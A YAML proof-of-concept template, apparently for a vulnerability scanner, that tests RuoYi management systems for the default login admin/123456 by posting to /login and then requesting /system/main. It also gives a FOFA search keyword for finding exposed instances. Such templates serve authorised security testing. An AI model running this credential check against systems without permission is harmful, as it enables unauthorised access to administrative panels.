name: poc-yaml-ruo-yi-default-password
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /login
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
            body: username=admin&password=123456&rememberMe=false
        expression: response.status == 200 && response.body.bcontains(b"code\":0")
    r1:
        request:
            cache: true
            method: GET
            path: /system/main
        expression: response.status == 200
expression: r0() && r1()
detail:
    author: cysec
    links:
        - http://cysec.com
    fofakeyword: app="若依-管理系统"
    tips: 若依-管理系统